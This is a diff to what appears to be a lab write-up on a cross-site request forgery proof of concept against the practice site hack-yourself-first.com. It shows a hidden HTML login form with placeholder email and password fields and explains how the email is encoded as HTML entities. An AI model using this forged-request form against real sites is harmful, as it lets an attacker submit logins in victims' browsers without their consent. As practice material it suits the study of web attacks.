@@ -13,7 +13,7 @@ If you do not have Burpsuite pro, then here is the CSRF PoC:
   <script>history.pushState('', '', '/')</script>
     <form action="https://hack-yourself-first.com/Account/Login" method="POST">
       <input type="hidden" name="Email" value="$email&#64;$email&#46;$email" />
-      <input type="hidden" name="Password" value="1234pass" />
+      <input type="hidden" name="Password" value="$password" />
       <input type="hidden" name="RememberMe" value="false" />
       <input type="submit" value="Submit request" />
     </form>
@@ -24,7 +24,10 @@ If you do not have Burpsuite pro, then here is the CSRF PoC:
 </html>
 
 
-update $email with their respective ones,
+update $email and $password with their respective ones,
 
 "&#64" is "@" symbol
 "&#46" is "." 
+
+For example, if your email is "example@hacker.com", then your email will look like this : "example&#64;hacker&#46;com",
+but it will be decoded to "example@hacker.com".
